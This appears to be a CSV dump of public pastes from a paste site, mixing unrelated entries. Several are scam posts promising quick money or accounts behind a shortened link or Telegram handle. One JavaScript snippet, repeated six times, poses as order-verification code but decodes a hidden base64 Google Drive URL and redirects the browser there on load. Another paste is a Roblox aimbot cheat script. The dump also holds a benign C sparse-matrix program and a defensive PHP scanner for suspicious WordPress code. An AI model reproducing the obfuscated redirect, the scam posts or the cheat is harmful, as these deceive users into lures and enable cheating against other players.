id,title,username,language,date,content
FKmmiZnz,Random Gmail Acc EB,Saba1022,JavaScript,Saturday 22nd of March 2025 07:05:42 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

0DN8PVkC3V
"
4PWBYaXs,EARN $900 INSTANTLY 2025 XN,jyufctjt,JavaScript,Saturday 22nd of March 2025 07:03:24 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

c38Pwq4Z9D
"
fkiyTKF1,Random Gmail Acc EB,jyufctjt,JavaScript,Saturday 22nd of March 2025 07:01:20 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

eFl0Idtck0
"
szp4gjR1,Untitled,AdamBomb1116,JavaScript,Saturday 22nd of March 2025 07:01:04 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/950/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Csd1YsyS,dataNone,TestGuy1,JSON,Saturday 22nd of March 2025 07:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '9714e939b66cc4bed18d35932d8d0134d6846174b7d01994ec20ea53b242b7aba315a0c604fac37054ae55dad02daad3e1e9babb7551574e17a173277829de4ea2441588023f26e424f2af7f219f21d954c0e89f86d3f3b768f901e0ebafbd3cb8da144c152ce5c8638bf06af371060e11496df06e2fbf7f93e9ed128ca5c65f',
  otherdata: [
    'cbd200fa33ebe6329bb2cc7922984e7c',
    '3de5efae8220d9b9d133e4367a1a5682',
    '0ac576c705ab5d2e369b03269ca90342',
    '85a1eecb003c0885c5ac49cca6c90228',
    'e6f4e24a72ef9db8d70d4e1e0206f1e4',
    '6d3af120ce12bbb6cf46ca7e0aa73baf',
    'ae89fc5aee6317f2d3b9901588a2f9bf',
    'ca8e56a2e5f69ee6710910262ee28ca1'
  ]
}"
q7gsyCad,rare matrix,STANAANDREY,C,Saturday 22nd of March 2025 06:59:48 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

#define NMAX 1000
typedef struct {
	int rows, cols, len;
	int row[NMAX], col[NMAX];
	double val[NMAX];
} RareMatrix;

static void readRareMatrix(RareMatrix* m) {
	assert(scanf_s(""%d%d%d"", &m->rows, &m->cols, &m->len));
	for (int i = 0; i < m->len; i++) {
		assert(scanf_s(""%d%d%lf"", &m->row[i], &m->col[i], &m->val[i]));
	}
}

static void printRareMatrix(const RareMatrix* const rMat) {
	for (int i = 0; i < rMat->rows; i++) {
		for (int j = 0; j < rMat->cols; j++) {
			double val = .0;
			for (int k = 0; k < rMat->len; k++) {
				if (rMat->row[k] == i && rMat->col[k] == j) {
					val = rMat->val[k];
					break;
				}
			}
			printf(""%lf "", val);
		}
		printf(""\n"");
	}
}

static void addRareMats(const RareMatrix* const rMat1, const RareMatrix* const rMat2, RareMatrix* rMat3) {
	rMat3->rows = rMat1->rows;
	rMat3->cols = rMat1->cols;
	rMat3->len = 0;
	for (int i = 0; i < rMat1->len; i++) {
		rMat3->row[rMat3->len] = rMat1->row[i];
		rMat3->col[rMat3->len] = rMat1->col[i];
		rMat3->val[rMat3->len] = rMat1->val[i];
		rMat3->len++;
	}
	for (int i = 0; i < rMat2->len; i++) {
		int j;
		for (j = 0; j < rMat3->len; j++) {
			if (rMat3->row[j] == rMat2->row[i] && rMat3->col[j] == rMat2->col[i]) {
				rMat3->val[j] += rMat2->val[i];
				break;
			}
		}
		if (j == rMat3->len) {
			rMat3->row[rMat3->len] = rMat2->row[i];
			rMat3->col[rMat3->len] = rMat2->col[i];
			rMat3->val[rMat3->len] = rMat2->val[i];
			rMat3->len++;
		}
	}
}

int	main() {
	RareMatrix rMat1, rMat2, rMat3;
	readRareMatrix(&rMat1);
	readRareMatrix(&rMat2);
	addRareMats(&rMat1, &rMat2, &rMat3);
	printRareMatrix(&rMat3);
	return 0;
}"
xjcTHmps,Make $1000 15-MINUTES (BEGINNER) L8,jyufctjt,JavaScript,Saturday 22nd of March 2025 06:59:15 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

iyNpr9gAEi
"
0MMAuSSs,Binance account IL,jyufctjt,JavaScript,Saturday 22nd of March 2025 06:57:11 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

cYTDwgnYkv
"
ExGv26fR,Untitled,AdamBomb1116,JavaScript,Saturday 22nd of March 2025 06:55:10 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/109/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
R5rKHep2,EARN $900 INSTANTLY 2025 XN,jyufctjt,JavaScript,Saturday 22nd of March 2025 06:55:07 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

EwudMM4ioA
"
EwQdTu4g,Random Gmail Acc EB,jyufctjt,JavaScript,Saturday 22nd of March 2025 06:53:03 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

5x0Xxe4xEA
"
iS334c8h,Make $1000 15-MINUTES (BEGINNER) L8,jyufctjt,JavaScript,Saturday 22nd of March 2025 06:50:57 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

XJfK8QMXdZ
"
cs7jK6wF,Untitled,AdamBomb1116,JavaScript,Saturday 22nd of March 2025 06:49:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/272/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ePHPC6ht,Binance account IL,jyufctjt,JavaScript,Saturday 22nd of March 2025 06:48:50 AM CDT," 
Tutorial: https://minilink.pro/Xt7L

Enjoy

4UUXpsw9ss
"
HJ4pZ6L4,"Check WP-Scripts for ""uncommon"" code",MarcHumer,PHP,Saturday 22nd of March 2025 06:48:05 AM CDT,"<?php
if (session_status() === PHP_SESSION_NONE) {
	ini_set('ignore_repeated_errors', TRUE);
	ini_set('display_errors', FALSE);
	ini_set('log_errors', TRUE);
	ini_set('error_log', 'errors.txt');
	ini_set('log_errors_max_len', 1024);
	ini_set('set_time_out',500);
	error_reporting(E_ALL);
	session_start();
	$_SESSION['monitoring']=1;
}
$ausgabe = array();
if (!empty($_REQUEST['typ']) && isset($_REQUEST['typ']))
{
	$par = strtoupper(trim(strip_tags(stripslashes($_REQUEST['typ']))));
	$par = explode("","",$par);
} else $par = array('A','B','C','D','E','F');

if (isset($_REQUEST['sub']))
{
	$maxDepth = (int)($_REQUEST['sub']);
} else $maxDepth = -1;



$basedir = 
$directory = './'; // Current directory
echo '<h3>vMon - PHP auf potentielle Schwachstellen untersuchen</h3>
<p>maximale Such-Tiefe: '.($maxDepth==-1?""unbegrenzt"":$maxDepth).'</p>

<p>Parameter: 
<br>- sub=[Verzeichnis-Tiefe] (Default: alle Dateien)
<br>- typ=[A-F] (Default: alle Typen)</p>';
flush();

function getFilesInDirectoryAndSubdirectories($dir, $maxDepth = -1, $currentDepth = 0) {
	if ($maxDepth>-1 && $currentDepth > $maxDepth) {
  	return [];
	}
	$files = [];
	if ($dir!=""./stats"" && $dir != './awstats' && $dir != './cgi-bin' && $dir != './logs')
	{
		$iterator = new DirectoryIterator($dir);
		foreach ($iterator as $file) {
			if ($file->isDot()) continue;
			if ($file->isFile()) {
				$files[] = $file->getPathname();
			} elseif ($file->isDir()) {
				$subFiles = getFilesInDirectoryAndSubdirectories($file->getPathname(), $maxDepth, $currentDepth + 1);
				$files = array_merge($files, $subFiles);
			}
		}
	}
  return $files;
}

function h($d) {
	return str_replace(basename($d),'<b style=""color:#00f;"">'.basename($d).'</b>',$d);
}

function verlinkung($d) {
	global $basedir;
	$x = str_replace(basename($_SERVER['REQUEST_URI']),"""",$_SERVER['REQUEST_URI']).str_replace(array(""\\"",$_SERVER['DOCUMENT_ROOT']),array(""/"",''),($d));
	$x = str_replace($basedir,'',$x);
	return $x;
}

function genLine($typ,$filePath,$fdate,$fsize,$pat,$hit,$ln) {
	$s = '<td>'.$typ.'</td>';
	$s .= '<td style=""color:#666666;"">'.h(verlinkung($filePath)).'</td>';
	$s .= '<td>'.$fdate.'</td>';
	$s .= '<td>'.$fsize.'</td>';
	if ($hit==0)
		$s .= '<td colspan=""2"">'.$pat.'</td>';
	else {
		$s .= '<td>'.$pat.'</td>';
		$s .= '<td>'.$hit.'</td>';
	}
	$s .= '<td>'.$ln.'</td>';
	return $s;
}

$files = getFilesInDirectoryAndSubdirectories($directory, $maxDepth);
echo '<h4>Durchsucht: '.count($files).' Dateien</h4>';
echo '
 <p>A findet $GLOBALS[$var] (potentiell unsicher, Fall zu Fall prüfen)
<br>B sucht ungewöhnlichen Auskommentierungen /* &hellip; */
<br>C findet Zuordnungen von Globals, die verdächtig sind
<br>D findet (@)includes mit Variablen als Namens-Übergabe
<br>E findet ungewöhnlichen Zeichen-Kodierungen wie chr(&hellip;)
<br>F findet Null-Byte-Files
<br>&nbsp;</p>
<p><B>Wichtig!</B> Natürlich sind nicht alle Funde Malware.<br>Oft ist der Code drum herum entscheidend, ob ein Konstrukt problematisch oder gar gefährlich ist.<br>Aber das Script zeigt potentielle Schwachstellen auf, die zu prüfen sich lohnt.</p>';
flush();

foreach ($files as $file) {
	if ($file != '.' && $file != '..' && !strpos($file,"".gz"")
	&& (strpos($file,"".php"")||strpos($file,"".css"")||strpos($file,"".scss"")||strpos($file,"".png"")||strpos($file,"".js""))
	&& is_file($directory . $file)
	&& basename($file)!='vmon.php'	) {
		$filePath = $directory . $file;
		$date = date(""Y-m-d H:i:s"", filemtime($filePath));
		$size = filesize($filePath);

	if (in_array(""F"", $par)){
		if ($size==0 && basename($filePath)!=""index.php"") {
			$out = '<tr class=""c6"">';
			$out .= genLine('F',$filePath,$date,0,'0-Byte-File',0,$zeile);
			$out .= '</tr>';
			$ausgabe[] = $out; 
			continue;
		}
	}

	$lines = explode(""\n"",file_get_contents($filePath));
		$t = -1;
		$zeile = 0;
		foreach ($lines as $line) {
			$zeile ++;
			$line = str_replace('/***/','',$line).""\n"";
			$t = strpos($line,'$GLOBALS[');
			if (in_array(""A"", $par) && $t !==FALSE && substr($line,$t+9,1)!='""' && substr($line,$t+9,1)!=""'"") {
				$firstOccurrence = htmlentities(substr($line,$t,30));
				$out = '<tr class=""c1"">';
				$out .= genLine('A',$filePath,$date,$size,$firstOccurrence,0,$zeile);
				$out .= '</tr>';
				$ausgabe[] = $out; 
			}
			elseif (in_array(""B"", $par) && preg_match('#\/\*\w+\s\*\/#', $line, $matches)) {
				$firstOccurrence = htmlentities($matches[0]);
				$out = '<tr class=""c2"">';
				$out .= genLine('B',$filePath,$date,$size,$firstOccurrence,sizeof($matches),$zeile);
				$out .= '</tr>';
				$ausgabe[] = $out; 
			}
						elseif (in_array(""C"", $par) && preg_match('#\$(.*?)\s=\s\$GLOBALS(?:\s|;)\s*#', $line, $matches)) {
				$firstOccurrence = htmlentities($matches[0]);
				$out = '<tr class=""c3"">';
				$out .= genLine('C',$filePath,$date,$size,$firstOccurrence,sizeof($matches),$zeile);
				$out .= '</tr>';
				$ausgabe[] = $out; 
			}
			elseif (in_array(""D"", $par) && preg_match('/@?include\s*\(\s*(\$\w+)\s*\)/', $line, $matches)) {
		    $a = strpos($line, ""include"");
		    $firstOccurrence = htmlentities(substr($line, $a, 30));
		    $out = '<tr class=""c4"">';
				$out .= genLine('D',$filePath,$date,$size,$firstOccurrence,sizeof($matches),$zeile);
		    $out .= '</tr>';
		    $ausgabe[] = $out;
			}
			elseif (in_array(""E"", $par) && preg_match('/chr\((\w+)[-](\w+)\)/', $line, $matches)) {
				$firstOccurrence = htmlentities($matches[0]);
				$out = '<tr class=""c5"">';
				$out .= genLine('E',$filePath,$date,$size,$firstOccurrence,sizeof($matches),$zeile);
				$out .= '</tr>';
				$ausgabe[] = $out; 
			}
		}
	}
}

if (sizeof($ausgabe)>0)
{
	sort($ausgabe);
echo<<<hd
<style>
td a{color:#000 !important}
.c1{background-color:#ff9999}
.c2{background-color:#99ff99}
.c3{background-color:#9999ff}
.c4{background-color:#ffff99}
.c5{background-color:#99ffff}
.c6{background-color:#ff99ff}
</style>
<table border=""1""><tr><th>TYP</th><th style=""width:300px;"">Name</th><th>Datum/Zeit</th><th>Größe</th><th>Muster</th><th>Treffer</th><th>Zeile</th></tr>
hd;
	foreach($ausgabe as $zeile) echo $zeile;
	echo '</table>';
} else echo ""Keine Treffer"";"
Gedq5DhB,Untitled,AdamBomb1116,JavaScript,Saturday 22nd of March 2025 06:44:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/660/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hwShjN20,EARN $900 INSTANTLY 2025 OL,yorman342,JavaScript,Saturday 22nd of March 2025 06:39:20 AM CDT," 
Tutorial: tg @CurrentLeak

Enjoy

YYNAjJLZlm
"
wt3qx14C,Random Gmail Acc JT,yorman342,JavaScript,Saturday 22nd of March 2025 06:37:16 AM CDT," 
Tutorial: tg @CurrentLeak

Enjoy

xmBVeup4dI
"
DYCmN4xF,Make $1000 15-MINUTES (BEGINNER) 55,yorman342,JavaScript,Saturday 22nd of March 2025 06:35:10 AM CDT," 
Tutorial: tg @CurrentLeak

Enjoy

9Zbo0G0Rwb
"
jMKKGm5a,Untitled,AdamBomb1116,JavaScript,Saturday 22nd of March 2025 06:33:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/553/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sizmVVt3,Binance account FJ,yorman342,JavaScript,Saturday 22nd of March 2025 06:33:04 AM CDT," 
Tutorial: tg @CurrentLeak

Enjoy

qGkk4aChO8
"
ru4wvdxK,Untitled,AdamBomb1116,JavaScript,Saturday 22nd of March 2025 06:27:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/549/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
THHDBBbx,Make $1000 15-MINUTES (BEGINNER) 55,davidthepro1251376,JavaScript,Saturday 22nd of March 2025 06:26:22 AM CDT," 
Tutorial: tg @CurrentLeak

Enjoy

MCsdKYOKof
"
ufBWT1uP,Untitled,AdamBomb1116,JavaScript,Saturday 22nd of March 2025 06:22:31 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/686/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mNhSfyML,enuxys aimbot v3 humanoidrootpart,caestus6809,Lua,Saturday 22nd of March 2025 06:19:34 AM CDT,"--[[

	Universal Aimbot Module by Exunys © CC0 1.0 Universal (2023 - 2024)
	https://github.com/Exunys

]]

--// Cache

local game, workspace = game, workspace
local getrawmetatable, getmetatable, setmetatable, pcall, getgenv, next, tick = getrawmetatable, getmetatable, setmetatable, pcall, getgenv, next, tick
local Vector2new, Vector3zero, CFramenew, Color3fromRGB, Color3fromHSV, Drawingnew, TweenInfonew = Vector2.new, Vector3.zero, CFrame.new, Color3.fromRGB, Color3.fromHSV, Drawing.new, TweenInfo.new
local getupvalue, mousemoverel, tablefind, tableremove, stringlower, stringsub, mathclamp = debug.getupvalue, mousemoverel or (Input and Input.MouseMove), table.find, table.remove, string.lower, string.sub, math.clamp

local GameMetatable = getrawmetatable and getrawmetatable(game) or {
	-- Auxillary functions - if the executor doesn't support ""getrawmetatable"".

	__index = function(self, Index)
		return self[Index]
	end,

	__newindex = function(self, Index, Value)
		self[Index] = Value
	end
}

local __index = GameMetatable.__index
local __newindex = GameMetatable.__newindex

local getrenderproperty, setrenderproperty = getrenderproperty or __index, setrenderproperty or __newindex

local GetService = __index(game, ""GetService"")

--// Services

local RunService = GetService(game, ""RunService"")
local UserInputService = GetService(game, ""UserInputService"")
local TweenService = GetService(game, ""TweenService"")
local Players = GetService(game, ""Players"")

--// Service Methods

local LocalPlayer = __index(Players, ""LocalPlayer"")
local Camera = __index(workspace, ""CurrentCamera"")

local FindFirstChild, FindFirstChildOfClass = __index(game, ""FindFirstChild""), __index(game, ""FindFirstChildOfClass"")
local GetDescendants = __index(game, ""GetDescendants"")
local WorldToViewportPoint = __index(Camera, ""WorldToViewportPoint"")
local GetPartsObscuringTarget = __index(Camera, ""GetPartsObscuringTarget"")
local GetMouseLocation = __index(UserInputService, ""GetMouseLocation"")
local GetPlayers = __index(Players, ""GetPlayers"")

--// Variables

local RequiredDistance, Typing, Running, ServiceConnections, Animation, OriginalSensitivity = 2000, false, false, {}
local Connect, Disconnect = __index(game, ""DescendantAdded"").Connect

--[[
local Degrade = false

do
	xpcall(function()
		local TemporaryDrawing = Drawingnew(""Line"")
		getrenderproperty = getupvalue(getmetatable(TemporaryDrawing).__index, 4)
		setrenderproperty = getupvalue(getmetatable(TemporaryDrawing).__newindex, 4)
		TemporaryDrawing.Remove(TemporaryDrawing)
	end, function()
		Degrade, getrenderproperty, setrenderproperty = true, function(Object, Key)
			return Object[Key]
		end, function(Object, Key, Value)
			Object[Key] = Value
		end
	end)

	local TemporaryConnection = Connect(__index(game, ""DescendantAdded""), function() end)
	Disconnect = TemporaryConnection.Disconnect
	Disconnect(TemporaryConnection)
end
]]

--// Checking for multiple processes

if ExunysDeveloperAimbot and ExunysDeveloperAimbot.Exit then
	ExunysDeveloperAimbot:Exit()
end

--// Environment

getgenv().ExunysDeveloperAimbot = {
	DeveloperSettings = {
		UpdateMode = ""RenderStepped"",
		TeamCheckOption = ""TeamColor"",
		RainbowSpeed = 1 -- Bigger = Slower
	},

	Settings = {
		Enabled = true,

		TeamCheck = false,
		AliveCheck = true,
		WallCheck = true,

		OffsetToMoveDirection = false,
		OffsetIncrement = 15,

		Sensitivity = 0, -- Animation length (in seconds) before fully locking onto target
		Sensitivity2 = 3.5, -- mousemoverel Sensitivity

		LockMode = 1, -- 1 = CFrame; 2 = mousemoverel
		LockPart = ""HumanoidRootPart"", -- Body part to lock on

		TriggerKey = Enum.UserInputType.MouseButton2,
		Toggle = false
	},

	FOVSettings = {
		Enabled = true,
		Visible = true,

		Radius = 90,
		NumSides = 60,

		Thickness = 1,
		Transparency = 1,
		Filled = false,

		RainbowColor = false,
		RainbowOutlineColor = false,
		Color = Color3fromRGB(255, 255, 255),
		OutlineColor = Color3fromRGB(0, 0, 0),
		LockedColor = Color3fromRGB(255, 150, 150)
	},

	Blacklisted = {},
	FOVCircleOutline = Drawingnew(""Circle""),
	FOVCircle = Drawingnew(""Circle"")
}

local Environment = getgenv().ExunysDeveloperAimbot

setrenderproperty(Environment.FOVCircle, ""Visible"", false)
setrenderproperty(Environment.FOVCircleOutline, ""Visible"", false)

--// Core Functions

local FixUsername = function(String)
	local Result

	for _, Value in next, GetPlayers(Players) do
		local Name = __index(Value, ""Name"")

		if stringsub(stringlower(Name), 1, #String) == stringlower(String) then
			Result = Name
		end
	end

	return Result
end

local GetRainbowColor = function()
	local RainbowSpeed = Environment.DeveloperSettings.RainbowSpeed

	return Color3fromHSV(tick() % RainbowSpeed / RainbowSpeed, 1, 1)
end

local ConvertVector = function(Vector)
	return Vector2new(Vector.X, Vector.Y)
end

local CancelLock = function()
	Environment.Locked = nil

	local FOVCircle = Environment.FOVCircle--Degrade and Environment.FOVCircle or Environment.FOVCircle.__OBJECT

	setrenderproperty(FOVCircle, ""Color"", Environment.FOVSettings.Color)
	__newindex(UserInputService, ""MouseDeltaSensitivity"", OriginalSensitivity)

	if Animation then
		Animation:Cancel()
	end
end

local GetClosestPlayer = function()
	local Settings = Environment.Settings
	local LockPart = Settings.LockPart

	if not Environment.Locked then
		RequiredDistance = Environment.FOVSettings.Enabled and Environment.FOVSettings.Radius or 2000

		for _, Value in next, GetPlayers(Players) do
			local Character = __index(Value, ""Character"")
			local Humanoid = Character and FindFirstChildOfClass(Character, ""Humanoid"")

			if Value ~= LocalPlayer and not tablefind(Environment.Blacklisted, __index(Value, ""Name"")) and Character and FindFirstChild(Character, LockPart) and Humanoid then
				local PartPosition, TeamCheckOption = __index(Character[LockPart], ""Position""), Environment.DeveloperSettings.TeamCheckOption

				if Settings.TeamCheck and __index(Value, TeamCheckOption) == __index(LocalPlayer, TeamCheckOption) then
					continue
				end

				if Settings.AliveCheck and __index(Humanoid, ""Health"") <= 0 then
					continue
				end

				if Settings.WallCheck then
					local BlacklistTable = GetDescendants(__index(LocalPlayer, ""Character""))

					for _, Value in next, GetDescendants(Character) do
						BlacklistTable[#BlacklistTable + 1] = Value
					end

					if #GetPartsObscuringTarget(Camera, {PartPosition}, BlacklistTable) > 0 then
						continue
					end
				end

				local Vector, OnScreen, Distance = WorldToViewportPoint(Camera, PartPosition)
				Vector = ConvertVector(Vector)
				Distance = (GetMouseLocation(UserInputService) - Vector).Magnitude

				if Distance < RequiredDistance and OnScreen then
					RequiredDistance, Environment.Locked = Distance, Value
				end
			end
		end
	elseif (GetMouseLocation(UserInputService) - ConvertVector(WorldToViewportPoint(Camera, __index(__index(__index(Environment.Locked, ""Character""), LockPart), ""Position"")))).Magnitude > RequiredDistance then
		CancelLock()
	end
end

local Load = function()
	OriginalSensitivity = __index(UserInputService, ""MouseDeltaSensitivity"")

	local Settings, FOVCircle, FOVCircleOutline, FOVSettings, Offset = Environment.Settings, Environment.FOVCircle, Environment.FOVCircleOutline, Environment.FOVSettings

	--[[
	if not Degrade then
		FOVCircle, FOVCircleOutline = FOVCircle.__OBJECT, FOVCircleOutline.__OBJECT
	end
	]]

	ServiceConnections.RenderSteppedConnection = Connect(__index(RunService, Environment.DeveloperSettings.UpdateMode), function()
		local OffsetToMoveDirection, LockPart = Settings.OffsetToMoveDirection, Settings.LockPart

		if FOVSettings.Enabled and Settings.Enabled then
			for Index, Value in next, FOVSettings do
				if Index == ""Color"" then
					continue
				end

				if pcall(getrenderproperty, FOVCircle, Index) then
					setrenderproperty(FOVCircle, Index, Value)
					setrenderproperty(FOVCircleOutline, Index, Value)
				end
			end

			setrenderproperty(FOVCircle, ""Color"", (Environment.Locked and FOVSettings.LockedColor) or FOVSettings.RainbowColor and GetRainbowColor() or FOVSettings.Color)
			setrenderproperty(FOVCircleOutline, ""Color"", FOVSettings.RainbowOutlineColor and GetRainbowColor() or FOVSettings.OutlineColor)

			setrenderproperty(FOVCircleOutline, ""Thickness"", FOVSettings.Thickness + 1)
			setrenderproperty(FOVCircle, ""Position"", GetMouseLocation(UserInputService))
			setrenderproperty(FOVCircleOutline, ""Position"", GetMouseLocation(UserInputService))
		else
			setrenderproperty(FOVCircle, ""Visible"", false)
			setrenderproperty(FOVCircleOutline, ""Visible"", false)
		end

		if Running and Settings.Enabled then
			GetClosestPlayer()

			Offset = OffsetToMoveDirection and __index(FindFirstChildOfClass(__index(Environment.Locked, ""Character""), ""Humanoid""), ""MoveDirection"") * (mathclamp(Settings.OffsetIncrement, 1, 30) / 10) or Vector3zero

			if Environment.Locked then
				local LockedPosition_Vector3 = __index(__index(Environment.Locked, ""Character"")[LockPart], ""Position"")
				local LockedPosition = WorldToViewportPoint(Camera, LockedPosition_Vector3 + Offset)

				if Environment.Settings.LockMode == 2 then
